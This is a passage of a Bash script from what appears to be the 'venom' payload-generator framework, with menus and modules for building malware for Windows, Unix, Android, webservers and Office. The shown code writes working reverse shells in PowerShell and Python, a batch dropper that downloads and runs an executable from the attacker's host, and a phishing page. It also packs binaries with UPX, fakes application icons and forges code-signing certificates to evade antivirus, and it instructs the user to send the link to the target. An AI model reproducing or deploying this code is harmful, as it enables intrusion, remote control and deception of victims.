echo "   \$data = (New-Object -TypeName \$PSArgException).GetString(\$bytes,0, \$i);" >> $IPATH/output/$NaM.ps1
echo "   \$sendback = (iex \$data | Out-String ) 2>&1;" >> $IPATH/output/$NaM.ps1
echo "   \$sendback2 = \$sendback + (pwd).Path + '> ';" >> $IPATH/output/$NaM.ps1
echo "   \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);" >> $IPATH/output/$NaM.ps1
echo "   \$sslStream.Write(\$sendbyte,0,\$sendbyte.Length);\$sslStream.Flush()" >> $IPATH/output/$NaM.ps1
echo "}" >> $IPATH/output/$NaM.ps1



## Generate SSL certificate openssl
cd $IPATH/output
echo "${BlueF}[☠]${white} Building SSL certificate (openssl) .."${Reset};sleep 2
xterm -T " Building SSL certificate " -geometry 110x23 -e "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj \"/C=US/ST=Texas/L=Albany/O=Global Security/OU=IT Department/CN=$CN\""
echo "${BlueF}[☠]${white} venom-main/output/key.pem + cert.pem ([${GreenF}OK${white}])${white} ..";sleep 1
cd $IPATH


## Building Phishing webpage
cd $IPATH/templates/phishing
echo "${BlueF}[☠]${white} Building HTTP Download WebPage (apache2) .."${Reset};sleep 2
sed "s|NaM3|http://$lhost/$Drop.zip|g" mega.html > mega1.html
mv mega1.html $ApAcHe/mega1.html > /dev/nul 2>&1
cd $IPATH


## Copy files to apache2 webroot
cd $IPATH/output
zip $Drop.zip $Drop.ps1 > /dev/nul 2>&1
echo "${BlueF}[☠]${white} Porting ALL required files to apache2 .."${Reset};sleep 2
cp $IPATH/output/$NaM.ps1 $ApAcHe/$NaM.ps1 > /dev/nul 2>&1
cp $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1
cd $IPATH



## Print attack vector on terminal
echo "${BlueF}[${GreenF}✔${BlueF}]${white} Starting apache2 webserver ..";sleep 2
echo "${BlueF}---"
echo "- ${YellowF}SEND THE URL GENERATED TO TARGET HOST${white}"
echo "${BlueF}- ATTACK VECTOR: http://$lhost/mega1.html"
echo "${BlueF}---"${Reset};
echo -n "${BlueF}[☠]${white} Press any key to start a handler .."
read odf
rm $IPATH/output/$NaM.ps1 > /dev/nul 2>&1
## START HANDLER
cd $IPATH/output
xterm -T " OPENSSL LISTENER - $lhost:$lport" -geometry 110x23 -e "openssl s_server -quiet -key key.pem -cert cert.pem -port $lport"
cd $IPATH
sleep 2


## Clean old files
echo "${BlueF}[☠]${white} Please Wait,cleaning old files ..${white}";sleep 2
rm $ApAcHe/$NaM.ps1 > /dev/nul 2>&1
rm $ApAcHe/$Drop.zip > /dev/nul 2>&1
rm $ApAcHe/mega1.html > /dev/nul 2>&1
rm $IPATH/output/$NaM.ps1 > /dev/nul 2>&1
rm $IPATH/output/cert.pem > /dev/nul 2>&1
rm $IPATH/output/key.pem > /dev/nul 2>&1
sh_menu
}






sh_evasion3 () {
Colors;

## WARNING ABOUT SCANNING SAMPLES (VirusTotal)
echo "---"
echo "- ${YellowF}WARNING ABOUT SCANNING SAMPLES (VirusTotal)"${Reset};
echo "- Please Dont test samples on Virus Total or on similar"${Reset};
echo "- online scanners, because that will shorten the payload life."${Reset};
echo "- And in testings also remmenber to stop the windows defender"${Reset};
echo "- from sending samples to \$Microsoft.."${Reset};
echo "---"
sleep 2

lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
NaM=$(zenity --title="☠ Enter FILENAME ☠" --text "example: Rel1k" --entry --width 300) > /dev/null 2>&1

## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$NaM" ]; then NaM="Rel1k";fi

## display final settings to user
echo "${BlueF}[${YellowF}i${BlueF}]${white} MODULE SETTINGS"${Reset};
echo "${BlueF}---"
cat << !
    LPORT    : $lport
    LHOST    : $lhost
    LOLBin   : powershell DownloadFile()
    DROPPER  : $IPATH/output/$NaM.bat
    AGENT    : $IPATH/output/$NaM.exe
!
echo "---${white}"


## BUILD LAUNCHER
echo "${BlueF}[☠]${white} Building Obfuscated bat dropper ..${white}";sleep 2
echo "@echo off" > $IPATH/output/Launcher.bat
echo "echo Please Wait, Installing Software .." >> $IPATH/output/Launcher.bat
echo "powershell -w 1 -C \"(New-Object Net.WebClient).DownloadFile('https://$lhost/$NaM.exe', '$NaM.exe')\" && Start $NaM.exe" >> $IPATH/output/Launcher.bat
echo "exit" >> $IPATH/output/Launcher.bat
cd $IPATH/output
mv Launcher.bat $NaM.bat
cd $IPATH


## Reverse TCP shell in python (ReliK Inspired)
echo "${BlueF}[☠]${white} Writting TCP reverse shell to output .."${Reset};
sleep 2
echo "#!/usr/bin/python" > $IPATH/output/Client_Shell.py
echo "# Simple Reverse TCP Shell Written by: Dave Kennedy (ReL1K)" >> $IPATH/output/Client_Shell.py
echo "# Copyright 2018 TrustedSec, LLC. All rights reserved." >> $IPATH/output/Client_Shell.py
echo "##" >> $IPATH/output/Client_Shell.py
echo "" >> $IPATH/output/Client_Shell.py
echo "import socket" >> $IPATH/output/Client_Shell.py
echo "import subprocess" >> $IPATH/output/Client_Shell.py
echo "" >> $IPATH/output/Client_Shell.py
echo "VOODOO = '$lhost'    # The remote lhost ip addr" >> $IPATH/output/Client_Shell.py
echo "KUNGFU = $lport               # The same port as used by the server" >> $IPATH/output/Client_Shell.py
echo "" >> $IPATH/output/Client_Shell.py
echo "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)" >> $IPATH/output/Client_Shell.py
echo "s.connect((VOODOO, KUNGFU))" >> $IPATH/output/Client_Shell.py
echo "while 1:" >> $IPATH/output/Client_Shell.py
echo "    data = s.recv(1024)" >> $IPATH/output/Client_Shell.py
echo "    proc = subprocess.Popen(data, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)" >> $IPATH/output/Client_Shell.py
echo "    stdout_value = proc.stdout.read() + proc.stderr.read()" >> $IPATH/output/Client_Shell.py
echo "    s.send(stdout_value)" >> $IPATH/output/Client_Shell.py
echo "# quit out afterwards and kill socket" >> $IPATH/output/Client_Shell.py
echo "s.close()" >> $IPATH/output/Client_Shell.py
## Rename python client
cp $IPATH/output/Client_Shell.py $IPATH/output/$NaM.py


## COMPILE/CHANGE EXE ICON (pyinstaller)
echo "${BlueF}[☠]${white} Changing $NaM.exe icon (pyinstaller) .."${Reset};
sleep 2

    ## Icon sellection
    IcOn=$(zenity --list --title "☠ ICON REPLACEMENT  ☠" --text "Chose one icon from the list." --radiolist --column "Pick" --column "Option" TRUE "dropbox.ico" FALSE "Microsoft-Excel.ico" FALSE "Microsoft-Word.ico" FALSE "Steam-logo.ico" FALSE "Windows-black.ico" FALSE "Windows-Logo.ico" FALSE "Windows-Store.ico" FALSE "Input your own icon" --width 330 --height 330) > /dev/null 2>&1
    if [ "$IcOn" = "Input your own icon" ]; then
      ImR=$(zenity --title "☠ ICON REPLACEMENT ☠" --filename=$IPATH --file-selection --text "chose icon.ico to use") > /dev/null 2>&1
      PaTh="$ImR"
    else
      PaTh="$IPATH/bin/icons/$IcOn"
    fi

    ## Compile and change icon
    cd $IPATH/output
    xterm -T " PYINSTALLER " -geometry 110x23 -e "su $user -c '$arch c:/$PyIn/Python.exe c:/$PiWiN/pyinstaller.py --noconsole -i $PaTh --onefile $IPATH/output/Client_Shell.py'"

    ## clean pyinstaller directory
    mv $IPATH/output/dist/Client_Shell.exe $IPATH/output/Client_Shell.exe > /dev/null 2>&1
    rm $IPATH/output/*.spec > /dev/null 2>&1
    rm $IPATH/output/*.log > /dev/null 2>&1
    rm -r $IPATH/output/dist > /dev/null 2>&1
    rm -r $IPATH/output/build > /dev/null 2>&1


## check UPX dependencie
upx_packer=`which upx`
if ! [ "$?" -eq "0" ]; then
  echo "${RedF}[x]${white} UPX Packer not found, installing .."${Reset};sleep 3
  echo "" && sudo apt-get install upx-ucl && echo ""
else
  ## AV evasion (pack binary with UPX)
  echo "${BlueF}[☠]${white} Packing final executable with UPX .."${Reset};sleep 2
  upx -9 -v -o $NaM.exe Client_Shell.exe > /dev/null 2>&1
fi


## Make sure CarbonCopy dependencies are installed
ossl_packer=`which osslsigncode`
if ! [ "$?" -eq "0" ]; then
  echo "${RedF}[x]${white} osslsigncode Package not found, installing .."${Reset};sleep 2
  echo "" && sudo apt-get install osslsigncode && pip3 install pyopenssl && echo ""
fi


## SIGN EXECUTABLE (paranoidninja - CarbonCopy)
echo "${BlueF}[☠]${white} Sign Executable for AV Evasion (CarbonCopy) .."${Reset};sleep 2
# random produces a number from 1 to 6
conv=$(cat /dev/urandom | tr -dc '1-6' | fold -w 1 | head -n 1)
# if $conv number output 'its small than' number 3 ...
if [ "$conv" "<" "3" ]; then SSL_domain="www.microsoft.com"; else SSL_domain="www.asus.com"; fi
echo "${BlueF}[${YellowF}i${BlueF}]${white} spoofed certificate: $SSL_domain"${Reset};sleep 2
cd $IPATH/obfuscate
xterm -T "VENOM - Signs an Executable for AV Evasion" -geometry 110x23 -e "python3 CarbonCopy.py $SSL_domain 443 $IPATH/output/$NaM.exe $IPATH/output/signed-$NaM.exe && sleep 2"
mv $IPATH/output/signed-$NaM.exe $IPATH/output/$NaM.exe
rm -r certs > /dev/nul 2>&1
chmod +x $IPATH/output/$NaM.exe > /dev/nul 2>&1
chmod +x $IPATH/output/$NaM.py > /dev/nul 2>&1
cd $IPATH/


## Copy files to apache2 webroot
echo "${BlueF}[☠]${white} Porting ALL required files to apache2 .."${Reset};sleep 2
cp $IPATH/output/$NaM.exe $ApAcHe/$NaM.exe > /dev/nul 2>&1
cp $IPATH/output/$NaM.bat $ApAcHe/$NaM.bat > /dev/nul 2>&1
rm $IPATH/output/Client_Shell.exe > /dev/nul 2>&1
rm $IPATH/output/Client_Shell.py > /dev/nul 2>&1


## Phishing webpage
cd $IPATH/templates/phishing
sed "s|NaM3|http://$lhost/$NaM.bat|g" mega.html > mega1.html
mv mega1.html $ApAcHe/mega1.html > /dev/nul 2>&1
cd $IPATH


## Print attack vector on terminal
echo "${BlueF}[${GreenF}✔${BlueF}]${white} Starting apache2 webserver ..";sleep 2
echo "${BlueF}---"
echo "- ${YellowF}SEND THE URL GENERATED TO TARGET HOST${white}"
echo "${BlueF}- ATTACK VECTOR: http://$lhost/mega1.html"
echo "${BlueF}---"${Reset};
echo -n "${BlueF}[☠]${white} Press any key to start a handler .."
read odf
rm $IPATH/output/$NaM.py > /dev/nul 2>&1
## START HANDLER
xterm -T " NETCAT LISTENER - $lhost:$lport" -geometry 110x23 -e "sudo nc -lvp $lport"


## Clean old files
echo "${BlueF}[☠]${white} Please Wait,cleaning old files .."${Reset};sleep 2
rm $ApAcHe/$NaM.exe > /dev/nul 2>&1
rm $ApAcHe/$NaM.bat > /dev/nul 2>&1
rm $ApAcHe/mega1.html > /dev/nul 2>&1
sh_menu
}




# ------------------------------
# SUB-MENUS (payload categories)
# ------------------------------
sh_unix_menu () {
echo ${BlueF}[☠]${white} Loading ${YellowF}[Unix]${white} agents ..${Reset};
sleep 2
cat << !


    AGENT Nº1:
    ╔──────────────────────────────────────────────────────────────
    | TARGET SYSTEMS     : Linux|Bsd|Solaris|OSx
    | SHELLCODE FORMAT   : C
    | AGENT EXTENSION    : ---
    | AGENT EXECUTION    : sudo ./agent
    | DETECTION RATIO    : http://goo.gl/XXSG7C

    AGENT Nº2:
    ╔──────────────────────────────────────────────────────────────
    | TARGET SYSTEMS     : Linux|Bsd|solaris
    | SHELLCODE FORMAT   : SH|PYTHON
    | AGENT EXTENSION    : DEB
    | AGENT EXECUTION    : sudo dpkg -i agent.deb
    | DETECTION RATIO    : https://goo.gl/RVWKff

    AGENT Nº3:
    ╔──────────────────────────────────────────────────────────────
    | TARGET SYSTEMS     : Linux|Bsd|Solaris
    | SHELLCODE FORMAT   : ELF
    | AGENT EXTENSION    : ELF
    | AGENT EXECUTION    : sudo ./agent.elf
    | DETECTION RATIO    : https://goo.gl/YpyYwk

    AGENT Nº4:
    ╔──────────────────────────────────────────────────────────────
    | TARGET SYSTEMS     : Linux (htop trojan)
    | SHELLCODE FORMAT   : C
    | AGENT EXTENSION    : DEB
    | AGENT EXECUTION    : sudo ./agent.deb
    | DETECTION RATIO    : https://goo.gl/naohaainda

    AGENT Nº5:
    ╔──────────────────────────────────────────────────────────────
    | TARGET SYSTEMS     : Linux (mp4 trojan)
    | SHELLCODE FORMAT   : C
    | AGENT EXTENSION    : MP4
    | AGENT EXECUTION    : sudo ./ricky-video.mp4
    | DETECTION RATIO    : https://goo.gl/naohaainda


    ╔─────────────────────────────────────────────────────────────╗
    ║   M    - Return to main menu                                ║
    ║   E    - Exit venom Framework                               ║
    ╚─────────────────────────────────────────────────────────────╝


!
echo ${BlueF}[☠]${white} Shellcode Generator${Reset}
sleep 1
echo -n ${BlueF}[${GreenF}➽${BlueF}]${white} Chose Agent number:${Reset}
read choice
case $choice in
1) sh_shellcode1 ;;
2) sh_shellcode20 ;;
3) sh_elf ;;
4) sh_debian ;;
5) sh_mp4_trojan ;;
m|M) sh_menu ;;
e|E) sh_exit ;;
*) echo ${RedF}[x]${white} "$choice": is not a valid Option${Reset}; sleep 2; clear; sh_unix_menu ;;
esac
}


# ------------------------
# MICROSOFT BASED PAYLOADS
# ------------------------
sh_microsoft_menu () {
echo ${BlueF}[☠]${white} Loading ${YellowF}[Microsoft]${white} agents ..${Reset};
sleep 2
cat << !


    AGENT Nº1:
    ╔──────────────────────────────────────────────────────────────
    | TARGET SYSTEMS     : Windows
    | SHELLCODE FORMAT   : C (uuid obfuscation)
    | AGENT EXTENSION    : DLL|CPL
    | AGENT EXECUTION    : rundll32.exe agent.dll,main | press to exec (cpl)
    | DETECTION RATIO    : http://goo.gl/NkVLzj

    AGENT Nº2:
    ╔──────────────────────────────────────────────────────────────
    | TARGET SYSTEMS     : Windows
    | SHELLCODE FORMAT   : DLL
    | AGENT EXTENSION    : DLL|CPL
    | AGENT EXECUTION    : rundll32.exe agent.dll,main | press to exec (cpl)
    | DETECTION RATIO    : http://goo.gl/dBGd4x

    AGENT Nº3:
    ╔──────────────────────────────────────────────────────────────
    | TARGET SYSTEMS     : Windows
    | SHELLCODE FORMAT   : C
    | AGENT EXTENSION    : PY(pyherion|NXcrypt)|EXE
    | AGENT EXECUTION    : python agent.py | press to exec (exe)
    | DETECTION RATIO    : https://goo.gl/7rSEyA (.py)
    | DETECTION RATIO    : https://goo.gl/WJ9HbD (.exe)

    AGENT Nº4:
    ╔──────────────────────────────────────────────────────────────
    | TARGET SYSTEMS     : Windows
    | SHELLCODE FORMAT   : C
    | AGENT EXTENSION    : EXE
    | AGENT EXECUTION    : press to exec (exe)
    | DETECTION RATIO    : https://goo.gl/WpgWCa

    AGENT Nº5:
    ╔──────────────────────────────────────────────────────────────
    | TARGET SYSTEMS     : Windows
    | SHELLCODE FORMAT   : PSH-CMD
    | AGENT EXTENSION    : EXE
    | AGENT EXECUTION    : press to exec (exe)
    | DETECTION RATIO    : https://goo.gl/MZnQKs

    AGENT Nº6:
    ╔──────────────────────────────────────────────────────────────
    | TARGET SYSTEMS     : Windows
    | SHELLCODE FORMAT   : C
    | AGENT EXTENSION    : RB
    | AGENT EXECUTION    : ruby agent.rb
    | DETECTION RATIO    : https://goo.gl/eZkoTP

    AGENT Nº7:
    ╔──────────────────────────────────────────────────────────────
    | TARGET SYSTEMS     : Windows
    | SHELLCODE FORMAT   : MSI-NOUAC
    | AGENT EXTENSION    : MSI
    | AGENT EXECUTION    : msiexec /quiet /qn /i agent.msi
    | DETECTION RATIO    : https://goo.gl/zcA4xu

    AGENT Nº8:
    ╔──────────────────────────────────────────────────────────────
    | TARGET SYSTEMS     : Windows
    | SHELLCODE FORMAT   : POWERSHELL
    | AGENT EXTENSION    : BAT
    | AGENT EXECUTION    : press to exec (bat)
    | DETECTION RATIO    : https://goo.gl/BYCUhb

    AGENT Nº9:
    ╔──────────────────────────────────────────────────────────────
    | TARGET SYSTEMS     : Windows
    | SHELLCODE FORMAT   : HTA-PSH
    | AGENT EXTENSION    : HTA
    | AGENT EXECUTION    : http://$IP
    | DETECTION RATIO    : https://goo.gl/mHC72C

    AGENT Nº10:
    ╔──────────────────────────────────────────────────────────────
    | TARGET SYSTEMS     : Windows
    | SHELLCODE FORMAT   : PSH-CMD
    | AGENT EXTENSION    : PS1 + BAT
    | AGENT EXECUTION    : press to exec (bat)
    | DETECTION RATIO    : https://goo.gl/GJHu7o

    AGENT Nº11:
    ╔──────────────────────────────────────────────────────────────
    | TARGET SYSTEMS     : Windows
    | SHELLCODE FORMAT   : PSH-CMD
    | AGENT EXTENSION    : BAT
    | AGENT EXECUTION    : press to exec (bat)
    | DETECTION RATIO    : https://goo.gl/nY2THB

    AGENT Nº12:
    ╔──────────────────────────────────────────────────────────────
    | TARGET SYSTEMS     : Windows
    | SHELLCODE FORMAT   : VBS
    | AGENT EXTENSION    : VBS
    | AGENT EXECUTION    : press to exec (vbs)
    | DETECTION RATIO    : https://goo.gl/PDL4qF

    AGENT Nº13:
    ╔──────────────────────────────────────────────────────────────
    | TARGET SYSTEMS     : Windows
    | SHELLCODE FORMAT   : PSH-CMD
    | AGENT EXTENSION    : VBS
    | AGENT EXECUTION    : press to exec (vbs)
    | DETECTION RATIO    : https://goo.gl/sd3867

    AGENT Nº14:
    ╔──────────────────────────────────────────────────────────────
    | TARGET SYSTEMS     : Windows
    | SHELLCODE FORMAT   : PSH-CMD|C
    | AGENT EXTENSION    : PDF
    | AGENT EXECUTION    : press to exec (pdf)
    | DETECTION RATIO    : https://goo.gl/N1VTPu

    AGENT Nº15:
    ╔──────────────────────────────────────────────────────────────
    | TARGET SYSTEMS     : Windows
    | SHELLCODE FORMAT   : EXE-SERVICE
    | AGENT EXTENSION    : EXE
    | AGENT EXECUTION    : sc start agent.exe
    | DETECTION RATIO    : https://goo.gl/dCYdCo

    AGENT Nº16:
    ╔──────────────────────────────────────────────────────────────
    | TARGET SYSTEMS     : Windows
    | SHELLCODE FORMAT   : C + PYTHON (uuid obfuscation)
    | AGENT EXTENSION    : EXE
    | AGENT EXECUTION    : press to exec (exe)
    | DETECTION RATIO    : https://goo.gl/HgnSQW

    AGENT Nº17:
    ╔──────────────────────────────────────────────────────────────
    | TARGET SYSTEMS     : Windows
    | SHELLCODE FORMAT   : C + AVET (obfuscation)
    | AGENT EXTENSION    : EXE
    | AGENT EXECUTION    : press to exec (exe)
    | DETECTION RATIO    : https://goo.gl/kKJuQ5

    AGENT Nº18:
    ╔──────────────────────────────────────────────────────────────
    | TARGET SYSTEMS     : Windows
    | SHELLCODE FORMAT   : SHELLTER (trojan embedded)
    | AGENT EXTENSION    : EXE
    | AGENT EXECUTION    : press to exec (exe)
    | DETECTION RATIO    : https://goo.gl/9MtQjM

    AGENT Nº19:
    ╔──────────────────────────────────────────────────────────────
    | TARGET SYSTEMS     : Windows
    | SHELLCODE FORMAT   : CSHARP
    | AGENT EXTENSION    : XML + BAT
    | AGENT EXECUTION    : press to exec (bat)
    | DETECTION RATIO    : https://goo.gl/coKiKx

    AGENT Nº20:
    ╔──────────────────────────────────────────────────────────────
    | TARGET SYSTEMS     : Windows
    | SHELLCODE FORMAT   : PSH-CMD|EXE
    | AGENT EXTENSION    : BAT|EXE
    | AGENT EXECUTION    : http://$IP/EasyFileSharing.hta
    | DETECTION RATIO    : https://goo.gl/R8UNW3

    AGENT Nº21:
    ╔──────────────────────────────────────────────────────────────
    | DESCRIPTION        : ICMP (ping) Reverse Shell
    | TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
    | AGENT EXTENSION    : EXE
    | DROPPER EXTENSION  : BAT
    | AGENT EXECUTION    : http://$IP/dropper.bat
    | DISCLOSURE BY      : @Daniel Compton (icmpsh.exe)

    ╔─────────────────────────────────────────────────────────────╗
    ║   M    - Return to main menu                                ║
    ║   E    - Exit venom Framework                               ║
    ╚─────────────────────────────────────────────────────────────╝


!
echo ${BlueF}[☠]${white} Shellcode Generator${Reset}
sleep 1
echo -n ${BlueF}[${GreenF}➽${BlueF}]${white} Chose Agent number:${Reset}
read choice
case $choice in
1) sh_shellcode2 ;;
2) sh_shellcode3 ;;
3) sh_shellcode4 ;;
4) sh_shellcode5 ;;
5) sh_shellcode6 ;;
6) sh_shellcode7 ;;
7) sh_shellcode8 ;;
8) sh_shellcode9 ;;
9) sh_shellcode10 ;;
10) sh_shellcode11 ;;
11) sh_shellcode12 ;;
12) sh_shellcode13 ;;
13) sh_shellcode14 ;;
14) sh_shellcode15 ;;
15) sh_shellcode22 ;;
16) sh_shellcode23 ;;
17) sh_shellcode24 ;;
18) sh_shellcode25 ;;
19) sh_shellcodecsharp ;;
20) sh_certutil ;;
21) sh_icmp_shell ;;
m|M) sh_menu ;;
e|E) sh_exit ;;
*) echo ${RedF}[x]${white} "$choice": is not a valid Option${Reset}; sleep 2; clear; sh_microsoft_menu ;;
esac
}



# ---------------
# MULTI-ARCH MENU
# ---------------
sh_multi_menu () {
echo ${BlueF}[☠]${white} Loading ${YellowF}[Multi-OS]${white} agents ..${Reset};
sleep 2
cat << !


    AGENT Nº1:
    ╔──────────────────────────────────────────────────────────────
    | TARGET SYSTEMS     : Windows|Linux|Bsd|Solaris|OSx
    | SHELLCODE FORMAT   : PYTHON
    | AGENT EXTENSION    : PY
    | AGENT EXECUTION    : python agent.py
    | DETECTION RATIO    : https://goo.gl/s5WqYS

    AGENT Nº2:
    ╔──────────────────────────────────────────────────────────────
    | TARGET SYSTEMS     : Windows|Linux|Bsd|Solaris
    | SHELLCODE FORMAT   : JAVA|PSH
    | AGENT EXTENSION    : JAR
    | AGENT EXECUTION    : http://$IP
    | DETECTION RATIO    : https://goo.gl/aEdLfD

    AGENT Nº3:
    ╔──────────────────────────────────────────────────────────────
    | TARGET SYSTEMS     : Windows|Linux|Bsd|Solaris|OSx
    | SHELLCODE FORMAT   : PYTHON|PSH
    | AGENT EXTENSION    : PY|BAT
    | AGENT EXECUTION    : python agent.py | press to exec (bat)
    | DETECTION RATIO    : https://goo.gl/vYLF8x

    AGENT Nº4:
    ╔──────────────────────────────────────────────────────────────
    | TARGET SYSTEMS     : Windows|Linux|Bsd|Solaris|OSx
    | SHELLCODE FORMAT   : PYTHON (uuid obfuscation)
    | AGENT EXTENSION    : PY
    | AGENT EXECUTION    : python agent.py
    | DETECTION RATIO    : https://goo.gl/nz8Hmr


    ╔─────────────────────────────────────────────────────────────╗
    ║   M    - Return to main menu                                ║
    ║   E    - Exit venom Framework                               ║
    ╚─────────────────────────────────────────────────────────────╝


!
echo ${BlueF}[☠]${white} Shellcode Generator${Reset}
sleep 1
echo -n ${BlueF}[${GreenF}➽${BlueF}]${white} Chose Agent number:${Reset}
read choice
case $choice in
1) sh_shellcode17 ;;
2) sh_shellcode18 ;;
3) sh_shellcode19 ;;
4) sh_shellcode26 ;;
m|M) sh_menu ;;
e|E) sh_exit ;;
*) echo ${RedF}[x]${white} "$choice": is not a valid Option${Reset}; sleep 2; clear; sh_multi_menu ;;
esac
}



# -----------------
# ANDRROID|IOS MENU
# -----------------
sh_android_menu () {
echo "${BlueF}[☠]${white} Loading ${YellowF}[Android|IOS]${white} agents .."${Reset};
sleep 2
cat << !


    AGENT Nº1:
    ╔──────────────────────────────────────────────────────────────
    | TARGET SYSTEMS     : Android
    | SHELLCODE FORMAT   : DALVIK
    | AGENT EXTENSION    : APK
    | AGENT EXECUTION    : Android appl install
    | DETECTION RATIO    : https://goo.gl/dy6bkF

    AGENT Nº2:
    ╔──────────────────────────────────────────────────────────────
    | TARGET SYSTEMS     : IOS
    | SHELLCODE FORMAT   : MACHO
    | AGENT EXTENSION    : MACHO
    | EXECUTE IN IOS     : chmod a+x agent.macho && ldid -S agent.macho
    | AGENT EXECUTION    : sudo ./agent.macho
    | DETECTION RATIO    : https://goo.gl/AhuyGs

    AGENT Nº3:
    ╔──────────────────────────────────────────────────────────────
    | TARGET SYSTEMS     : Android
    | SHELLCODE FORMAT   : Android ARM
    | AGENT EXTENSION    : PDF
    | AGENT EXECUTION    : agent.pdf (double clique)
    | DETECTION RATIO    : https://goo.gl/Empty
    | AFFECTED VERSIONS  : Adobe Reader versions less than 11.2.0


    ╔─────────────────────────────────────────────────────────────╗
    ║   M    - Return to main menu                                ║
    ║   E    - Exit venom Framework                               ║
    ╚─────────────────────────────────────────────────────────────╝


!
echo ${BlueF}[☠]${white} Shellcode Generator${Reset}
sleep 1
echo -n ${BlueF}[${GreenF}➽${BlueF}]${white} Chose Agent number:${Reset}
read choice
case $choice in
1) sh_shellcode21 ;;
2) sh_macho ;;
3) sh_android_pdf ;;
m|M) sh_menu ;;
e|E) sh_exit ;;
*) echo ${RedF}[x]${white} "$choice": is not a valid Option${Reset}; sleep 2; clear; sh_android_menu ;;
esac
}



# -------------
# WEBSHELL MENU
# -------------
sh_webshell_menu () {
echo ${BlueF}[☠]${white} Loading ${YellowF}[webshell]${white} agents ..${Reset};
sleep 2
cat << !


    AGENT Nº1:
    ╔──────────────────────────────────────────────────────────────
    | TARGET SYSTEMS     : Webservers|apache2
    | SHELLCODE FORMAT   : PHP
    | AGENT EXTENSION    : PHP
    | AGENT EXECUTION    : http://$IP/agent.php
    | DETECTION RATIO    : https://goo.gl/atfgWM

    AGENT Nº2:
    ╔──────────────────────────────────────────────────────────────
    | TARGET SYSTEMS     : Webservers|apache2
    | SHELLCODE FORMAT   : PHP (base64)
    | AGENT EXTENSION    : PHP
    | AGENT EXECUTION    : http://$IP/agent.php
    | DETECTION RATIO    : https://goo.gl/mq5QD8

    AGENT Nº3:
    ╔──────────────────────────────────────────────────────────────
    | TARGET SYSTEMS     : apache2 (Linux-Kali)
    | SHELLCODE FORMAT   : PHP (base64)
    | AGENT EXTENSION    : PHP + SH (unix_exploit)
    | AGENT EXECUTION    : http://$IP/trigger.sh
    | DETECTION RATIO    : https://goo.gl/wGgZtC


    ╔─────────────────────────────────────────────────────────────╗
    ║   M    - Return to main menu                                ║
    ║   E    - Exit venom Framework                               ║
    ╚─────────────────────────────────────────────────────────────╝


!
echo ${BlueF}[☠]${white} Shellcode Generator${Reset}
sleep 1
echo -n ${BlueF}[${GreenF}➽${BlueF}]${white} Chose Agent number:${Reset};
read choice
case $choice in
1) sh_shellcode16 ;;
2) sh_webshellbase ;;
3) sh_webshellunix ;;
m|M) sh_menu ;;
e|E) sh_exit ;;
*) echo ${RedF}[x]${white} "$choice": is not a valid Option${Reset}; sleep 2; clear; sh_webshell_menu ;;
esac
}



# -------------------
# MICOSOFT OFICE MENU
# -------------------
sh_world () {
echo ${BlueF}[☠]${white} Loading ${YellowF}[Office word]${white} agents ..${Reset};
sleep 2
# module description
cat << !


    AGENT Nº1:
    ╔──────────────────────────────────────────────────────────────
    | TARGET SYSTEMS     : Windows|OSx
    | SHELLCODE FORMAT   : C|PYTHON
    | AGENT EXTENSION    : DOCM
    | AGENT EXECUTION    : press to exec (docm)
    | DETECTION RATIO    : https://goo.gl/xcFKv8

    AGENT Nº2:
    ╔──────────────────────────────────────────────────────────────
    | TARGET SYSTEMS     : Windows
    | SHELLCODE FORMAT   : PYTHON
    | AGENT EXTENSION    : PPSX
    | AGENT EXECUTION    : press to exec (ppsx)
    | DETECTION RATIO    : https://goo.gl/r23dKW

    AGENT Nº3:
    ╔──────────────────────────────────────────────────────────────
    | TARGET SYSTEMS     : Windows
    | SHELLCODE FORMAT   : C
    | AGENT EXTENSION    : RTF
    | AGENT EXECUTION    : http://$IP:8080/doc | press to exec (rtf)
    | DETECTION RATIO    : https://goo.gl/fUqWA4


    ╔─────────────────────────────────────────────────────────────╗
    ║   M    - Return to main menu                                ║
    ║   E    - Exit venom Framework                               ║
    ╚─────────────────────────────────────────────────────────────╝


!
echo ${BlueF}[☠]${white} Shellcode Generator${Reset}
sleep 1
echo -n ${BlueF}[${GreenF}➽${BlueF}]${white} Chose Agent number:${Reset}
read choice
case $choice in
1) sh_world23 ;;
2) sh_world24 ;;
3) sh_world25 ;;
m|M) sh_menu ;;
e|E) sh_exit ;;
*) echo ${RedF}[x]${white} "$choice": is not a valid Option${Reset}; sleep 2; clear; sh_world ;;
esac
}




# -----------------------------
# MAIN MENU SHELLCODE GENERATOR
# -----------------------------
sh_menu () {
echo "main menu" > /dev/null 2>&1
}

# Loop forever
while :
do
clear && echo ${BlueF}
cat << !
            __    _ ______  ____   _  _____  ____    __
           \  \  //|   ___||    \ | |/     \|    \  /  |
            \  \// |   ___||     \| ||     ||     \/   |
             \__/  |______||__/\____|\_____/|__/\__/|__|$ver
!
echo "     ${BlueF}USER:${YellowF}$user ${BlueF}ENV:${YellowF}$EnV ${BlueF}INTERFACE:${YellowF}$InT3R ${BlueF}ARCH:${YellowF}$ArCh ${BlueF}DISTRO:${YellowF}$DiStR0"${BlueF}
cat << !
    ╔─────────────────────────────────────────────────────────────╗
    ║   1 - Unix based payloads                                   ║
    ║   2 - Windows-OS payloads                                   ║
    ║   3 - Multi-OS payloads                                     ║
    ║   4 - Android|IOS payloads                                  ║
    ║   5 - Webserver payloads                                    ║
    ║   6 - Microsoft office payloads                             ║
    ║   7 - System built-in shells                                ║
    ║   8 - Amsi Evasion Payloads                                 ║
    ║                                                             ║
    ║   E - Exit Shellcode Generator                              ║
    ╚─────────────────────────────────────────────────────────────╣
!
echo "                                                  ${YellowF}SSA${RedF}RedTeam${YellowF}@2019${BlueF}_|"

echo ${BlueF}[☠]${white} Shellcode Generator${Reset}
sleep 1
echo -n ${BlueF}[${GreenF}➽${BlueF}]${white} Chose Categorie number:${Reset}
read choice
case $choice in
